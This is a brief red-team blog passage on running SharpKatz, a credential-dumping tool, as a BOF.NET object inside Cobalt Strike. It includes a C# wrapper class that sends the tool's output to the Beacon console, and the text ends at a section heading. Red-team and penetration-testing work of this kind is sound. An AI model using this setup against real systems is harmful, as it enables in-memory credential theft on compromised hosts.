---
layout: single
title: "A look at BOF.NET, setting up for use with Cobalt Strike"
date: 2021-10-26
tags:  
  - windows
  - bof
  - red-team
  - c#
author_profile: true
---


## Introduction 

BOF.NET is a small native BOF object combined with the BOF.NET managed runtime that enables the development of Cobalt Strike BOFs directly in .NET. BOF.NET removes the complexity of native compilation along with the headaches of manually importing native API

Source : [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)


## Porting BOF.NET Classes to SharpKatz

While integrating the BOF.NET dll and writing the class to execute the application as a BOF file would look a little "hard" or messy I tried to keep the walkthrough as simple as possible.

Firstly you can download the DLL from the BOF.NET releases page : [https://github.com/CCob/BOF.NET/releases](https://github.com/CCob/BOF.NET/releases) or build it from the source code if you would like.

Afterwards you would want to Add the `dll` as a Reference to SharpKatz Source Code :

![img1](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post3/bof3.png)

I will go on and create a new C# Class file to add it into the SharpKatz code which will be the Execution class with the following little piece of code :

![img2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post3/bof3.png)

```csharp
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using BOFNET;

namespace SharpKatz
{
    public class Execute : BeaconObject
    {
        public Execute(BeaconApi api) : base(api) { }
        public override void Go(string[] args)
        {
            try
            {
                // Redirect stdout to MemoryStream
                var memStream = new MemoryStream();
                var memStreamWriter = new StreamWriter(memStream);
                memStreamWriter.AutoFlush = true;
                Console.SetOut(memStreamWriter);
                Console.SetError(memStreamWriter);

                // Run main program passing original arguments
                Program.Main(args);

                // Write MemoryStream to Beacon output
                BeaconConsole.WriteLine(Encoding.ASCII.GetString(memStream.ToArray()));

            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("\nBOF.NET Exception: {0}.", ex));
            }
        }
    }
}
```


## Importing BOF.NET to Cobalt Strike
